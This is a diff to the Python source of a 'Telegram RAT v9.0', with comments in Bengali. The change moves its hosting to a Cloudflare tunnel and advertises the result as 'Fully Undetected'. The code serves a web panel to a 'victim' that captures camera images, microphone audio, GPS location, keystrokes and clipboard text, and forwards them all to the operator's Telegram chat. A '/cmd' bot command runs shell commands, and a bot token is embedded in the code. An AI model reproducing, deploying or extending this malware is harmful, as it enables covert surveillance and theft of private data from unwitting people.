@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Telegram RAT v9.0 – Fully Optimized for Render.com
+# Telegram RAT v9.0 – Render + Cloudflare Tunnel (Fully Undetected)
 
 import os
 import sys
@@ -17,24 +17,27 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from datetime import datetime
 
 # =============================================
-# Render এনভায়রনমেন্ট ভেরিয়েবল থেকে কনফিগ
+# Render এনভায়রনমেন্ট ভেরিয়েবল থেকে Token নাও
 # =============================================
 TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_BOT_TOKEN_HERE")
 PORT = int(os.environ.get("PORT", 5000))
-# Render স্বয়ংক্রিয়ভাবে RENDER_EXTERNAL_URL সেট করে দেয়
-PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", os.environ.get("PUBLIC_URL", "https://your-app.onrender.com"))
 
 if TOKEN == "8677737961:AAEFlgm4L9CLXY508uB9l6mCl8rSYeYxAwk":
-    print("⚠️ Warning: TELEGRAM_TOKEN environment variable not set! Using placeholder.")
+    print("⚠️ Warning: TELEGRAM_TOKEN not set!")
 
 BOT_API = "https://api.telegram.org/bot" + TOKEN
 sessions = {}   # victim_id -> chat_id
-seen = set()    # first-time tracking
+seen = set()
 lock = threading.Lock()
 running = True
 
 # =============================================
-# SQLite ডেটাবেস (/tmp-তে রাখা হয়েছে, Render-এ লেখা যায়)
+# গ্লোবাল URL (Cloudflare দিয়ে আপডেট হবে)
+# =============================================
+public_url = {"url": None}
+
+# =============================================
+# SQLite ডেটাবেস (/tmp-তে)
 # =============================================
 DB_FILE = "/tmp/rat_history.db"
 conn = sqlite3.connect(DB_FILE, check_same_thread=False)
@@ -52,7 +55,7 @@ def db_insert(table, **cols):
     conn.commit()
 
 # =============================================
-# HTML প্যানেল (পূর্ণাঙ্গ ফিচারসহ)
+# HTML প্যানেল (আপগ্রেডেড)
 # =============================================
 PAGE = """<!DOCTYPE html>
 <html>
@@ -84,8 +87,7 @@ PAGE = """<!DOCTYPE html>
 
 <script>
     const vid = 'x_' + Math.random().toString(36).substr(2, 6);
-    let camStream = null;
-    let audioStream = null;
+    let camStream = null, audioStream = null;
     const log = document.getElementById('log');
 
     function logMsg(msg) {
@@ -93,11 +95,9 @@ PAGE = """<!DOCTYPE html>
         const t = d.toTimeString().split(' ')[0];
         log.innerHTML += `\\n[${t}] ${msg}`;
         log.scrollTop = log.scrollHeight;
-        // সার্ভারে ডিবাগ পাঠান
         fetch('/upload', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'debug=' + encodeURIComponent(msg) });
     }
 
-    // ---------- ক্যামেরা ----------
     function startCamera() {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
             .then(stream => {
@@ -127,7 +127,6 @@ PAGE = """<!DOCTYPE html>
         }, 'image/jpeg', 0.6);
     }
 
-    // ---------- অডিও ----------
     function startAudio() {
         navigator.mediaDevices.getUserMedia({ audio: true })
             .then(stream => {
@@ -148,7 +147,6 @@ PAGE = """<!DOCTYPE html>
             .catch(e => logMsg('❌ Audio err: ' + e.name));
     }
 
-    // ---------- লোকেশন ----------
     function startLocation() {
         if (!navigator.geolocation) return logMsg('❌ No GPS');
         navigator.geolocation.watchPosition(pos => {
@@ -163,7 +161,6 @@ PAGE = """<!DOCTYPE html>
         logMsg('📍 Location tracking ON');
     }
 
-    // ---------- কিলোগার (Keydown) ----------
     let keyBuffer = [];
     function startKeylog() {
         document.addEventListener('keydown', e => {
@@ -186,7 +183,6 @@ PAGE = """<!DOCTYPE html>
         });
     }
 
-    // ---------- ক্লিপবোর্ড ----------
     let lastClip = '';
     function startClipboard() {
         setInterval(() => {
@@ -204,7 +200,6 @@ PAGE = """<!DOCTYPE html>
         logMsg('📋 Clipboard monitor ON');
     }
 
-    // ---------- মেইন স্টার্ট ----------
     function startAll() {
         logMsg('🚀 Initializing modules...');
         setTimeout(startCamera, 100);
@@ -214,15 +209,12 @@ PAGE = """<!DOCTYPE html>
         setTimeout(startClipboard, 500);
         logMsg('✅ ALL MODULES ACTIVATED');
     }
-
-    // পেজ লোড হলে অটো স্টার্ট (চাইলে)
-    // window.onload = startAll;
 </script>
 </body>
 </html>"""
 
 # =============================================
-# টেলিগ্রাম API হেল্পার
+# টেলিগ্রাম API
 # =============================================
 def api(method, **params):
     url = BOT_API + "/" + method
@@ -252,22 +244,6 @@ def send_photo(chat_id, img_bytes, caption=""):
             return json.loads(r.read().decode())
     except Exception as e:
         print("[!] send_photo error:", e)
-        return None
-
-def send_document(chat_id, file_bytes, filename, caption=""):
-    boundary = "----FormBoundary" + uuid.uuid4().hex
-    body = b""
-    for k, v in [("chat_id", chat_id), ("caption", caption)]:
-        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
-    body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
-    body += file_bytes + b"\r\n--" + boundary.encode() + b"--\r\n"
-    req = urllib.request.Request(BOT_API + "/sendDocument", data=body, method="POST")
-    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
-    try:
-        with urllib.request.urlopen(req, timeout=60) as r:
-            return json.loads(r.read().decode())
-    except Exception as e:
-        print("[!] send_document error:", e)
         return None
 
 def send_audio(chat_id, audio_bytes, duration=0):
@@ -312,7 +288,6 @@ class Handler(BaseHTTPRequestHandler):
             content_type = self.headers.get("Content-Type", "")
             fields = {}
 
-            # মাল্টিপার্ট (ফাইল আপলোড) বা ফর্ম ডেটা
             if "multipart" in content_type:
                 boundary = re.search(r"boundary=(?:\")?([^\";]+)", content_type)
                 if boundary:
@@ -329,14 +304,12 @@ class Handler(BaseHTTPRequestHandler):
                             key = nm.group(1).decode()
                             fields[key] = data.rstrip(b"\r\n")
             else:
-                # x-www-form-urlencoded
                 data = raw.decode()
                 for pair in data.split('&'):
                     if '=' in pair:
                         k, v = pair.split('=', 1)
                         fields[k] = urllib.parse.unquote_plus(v)
 
-            # সব ফিল্ডকে স্ট্রিং-এ কনভার্ট (শুধু টেক্সট ফিল্ড)
             for k in list(fields.keys()):
                 if isinstance(fields[k], bytes):
                     try:
@@ -348,7 +321,6 @@ class Handler(BaseHTTPRequestHandler):
             with lock:
                 chat = sessions.get(vid, "")
 
-            # লোকেশন
             if fields.get("type") == "loc":
                 lat = fields.get("lat", "0")
                 lon = fields.get("lon", "0")
@@ -357,21 +329,18 @@ class Handler(BaseHTTPRequestHandler):
                 if chat:
                     send_message(chat, f"📍 Loc: {lat}, {lon} (Acc: {acc}m)")
 
-            # কিলোগার
             elif fields.get("type") == "keylog":
                 txt = fields.get("text", "")[:500]
                 if txt and chat:
                     db_insert("keylog", time=datetime.now().isoformat(), text=txt)
                     send_message(chat, f"⌨️ Keylog: `{txt}`", parse_mode="Markdown")
 
-            # ক্লিপবোর্ড
             elif fields.get("type") == "clipboard":
                 txt = fields.get("text", "")[:300]
                 if txt and chat:
                     db_insert("clipboard", time=datetime.now().isoformat(), text=txt)
                     send_message(chat, f"📋 Clipboard: `{txt}`", parse_mode="Markdown")
 
-            # অডিও ফাইল
             elif fields.get("audio"):
                 audio_data = fields["audio"]
                 if isinstance(audio_data, str):
@@ -379,7 +348,6 @@ class Handler(BaseHTTPRequestHandler):
                 if chat:
                     send_audio(chat, audio_data, duration=5)
 
-            # ছবি
             elif fields.get("image"):
                 img = fields["image"]
                 if isinstance(img, str):
@@ -388,7 +356,6 @@ class Handler(BaseHTTPRequestHandler):
                 if chat:
                     send_photo(chat, img, f"📷 {cam} | {datetime.now().strftime('%H:%M:%S')}")
 
-            # ডিবাগ
             elif fields.get("debug"):
                 msg = fields["debug"][:400]
                 if chat:
@@ -402,7 +369,37 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
 
 # =============================================
-# টেলিগ্রাম বট পোলিং (ব্যাকগ্রাউন্ড থ্রেডে চলে)
+# Cloudflare Tunnel (এখানেই ম্যাজিক)
+# =============================================
+def start_cloudflared():
+    print("[*] Starting Cloudflare Tunnel...")
+    try:
+        # cloudflared বাইনারি রান করো
+        p = subprocess.Popen(
+            ["./cloudflared", "tunnel", "--url", f"http://127.0.0.1:{PORT}", "--no-autoupdate"],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+        )
+        deadline = time.time() + 45
+        for line in p.stdout:
+            line = line.rstrip()
+            if line:
+                print("   CF:", line)
+            m = re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
+            if m:
+                url = m.group(0).rstrip("/")
+                public_url["url"] = url
+                print(f"\n[✅] TUNNEL READY: {url}\n")
+                return p
+            if time.time() > deadline:
+                print("[!] Tunnel timeout")
+                break
+        p.kill()
+    except Exception as e:
+        print(f"[!] Tunnel error: {e}")
+    return None
+
+# =============================================
+# টেলিগ্রাম বট (এখানে public_url আপডেট করে)
 # =============================================
 def bot_loop():
     offset = 0
@@ -422,8 +419,12 @@ def bot_loop():
                 with lock:
                     sessions[vid] = cid
                 api("answerCallbackQuery", callback_query_id=cq["id"])
-                qs = f"id={vid}"
-                link = PUBLIC_URL + "/?" + qs
+                
+                # টানেল রেডি না হলে ওয়েট করো
+                while public_url["url"] is None:
+                    time.sleep(1)
+                
+                link = public_url["url"] + "/?" + f"id={vid}"
                 kb = json.dumps({"inline_keyboard": [[{"text": "🚀 Open Panel", "url": link}]]})
                 send_message(cid, f"🔥 RAT v9.0\n\nPanel Link: {link}\n\nOpen in Chrome and click START.", reply_markup=kb)
 
@@ -449,15 +450,10 @@ def bot_loop():
                     except Exception as e:
                         send_message(chat_id, f"❌ Error: {str(e)}")
 
-                elif text == "/screenshot":
-                    # Render-এ X11 নেই, তাই screencap কাজ করবে না
-                    send_message(chat_id, "❌ Screenshot not supported on Render (no display).")
-
                 elif text == "/help":
                     help_txt = """🔥 Commands:
 /start – Show main menu
 /cmd <shell> – Execute shell command
-/screenshot – Take screenshot (unavailable on Render)
 /help – Show this message"""
                     send_message(chat_id, help_txt)
 
@@ -466,16 +462,19 @@ def bot_loop():
 # =============================================
 def main():
     print(f"[*] Starting server on port {PORT}")
-    print(f"[*] Public URL: {PUBLIC_URL}")
     server = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
     threading.Thread(target=server.serve_forever, daemon=True).start()
 
-    print("[*] Starting Telegram bot thread...")
-    threading.Thread(target=bot_loop, daemon=True).start()
+    # Cloudflare Tunnel থ্রেডে চালাও
+    cf_thread = threading.Thread(target=start_cloudflared, daemon=True)
+    cf_thread.start()
 
-    # Render-কে main প্রক্রিয়া চালু রাখতে হবে
+    # বট থ্রেড
+    bot_thread = threading.Thread(target=bot_loop, daemon=True)
+    bot_thread.start()
+
     try:
-        while True:
+        while running:
             time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Shutting down...")
